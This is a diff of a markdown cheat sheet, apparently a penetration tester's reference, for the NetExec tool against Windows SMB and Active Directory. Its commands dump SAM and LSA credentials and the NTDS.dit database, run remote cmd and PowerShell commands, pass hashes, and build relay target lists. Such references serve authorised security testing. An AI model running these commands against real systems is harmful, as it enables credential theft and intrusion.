@@ -1,90 +1,68 @@
 # NetExec
 
-Similar Syntax to CME
-
 ### Find ip/hostname/SMB Signinig/etc:
 
 ```bash
-netexec smb targets.txt
+sudo netexec smb targets.txt
+sudo netexec smb targets.txt --gen-relay-list relay.txt
 ```
 
-### Generate a list of SMB Signing disabled for relays
+### Enumerate SAM hashes
 
 ```bash
-netexec smb targets.txt --gen-relay-list relay.txt
+sudo netexec smb ip -u user -p 'password' --sam
+sudo netexec smb ip -u user -p 'password' --sam --user target-user
 ```
 
-### Find hosts user can log into/is admin on
+### Enumerate LSA for potential plaintext passwords
 
 ```bash
-netexec smb targets.txt -u user -p 'password'
+sudo netexec smb ip -u user -p 'password' --lsa
 ```
 
 ### Enumerate shares
 
 ```bash
-netexec smb ip -u user -p 'password' --shares
-```
-
-### Dump SAM
-
-```bash
-netexec smb ip -u user -p 'password' --sam
-```
-
-### Dump LSA
-
-```bash
-netexec smb ip -u user -p 'password' --lsa
+sudo netexec smb ip -u user -p 'password' --shares
 ```
 
 ### Pass cmd
 
 ```bash
-netexec smb ip -u user -p 'password' -x 'command'
+sudo netexec smb ip -u user -p 'password' -x 'command'
 ```
 
 ### Pass powershell
 
 ```bash
-netexec smb ip -u user -p 'password' -X 'command'
-```
-
-### List users if Guest account is enabled
-
-```bash
-netexec smb (ip) -u 'Guest' -p '' --rid-brute
+sudo netexec smb ip -u user -p 'password' -X 'command'
 ```
 
 ### Look at domain admins
 
 ```bash
-netexec smb ip -u user -p 'password' -x 'net group "Domain Admins" /domain'
+sudo netexec smb ip -u user -p 'password' -x 'net group "Domain Admins" /domain'
 ```
 
 ### Look at logged on users
 
 ```bash
-netexec smb ip -u user -p 'password' --loggedon-users
+sudo netexec smb ip -u user -p 'password' --loggedon-users
 ```
 
-### Look at NTDS.dit - is LOUD - USE WITH CAUTION
+### Look at NTDS.dit
+
+This is LOUD - use it with caution
 
 ```bash
-netexec smb dc-ip -u domain-admin-user -p 'password' --ntds
+sudo netexec smb dc-ip -u domain-admin-user -p 'password' --ntds
 ```
 
-## Database
+### Find out what machines a user can successfully log onto
 
-### View database
-
-```bash
-nxcdb
-```
-
-### View creds grabbed via SMB
+This is LOUD - use it with caution
 
 ```bash
-proto smb
-creds
+sudo netexec smb targets.txt -u user -p 'password'
+sudo netexec smb targets.txt -u user -H 'hash'
 ```
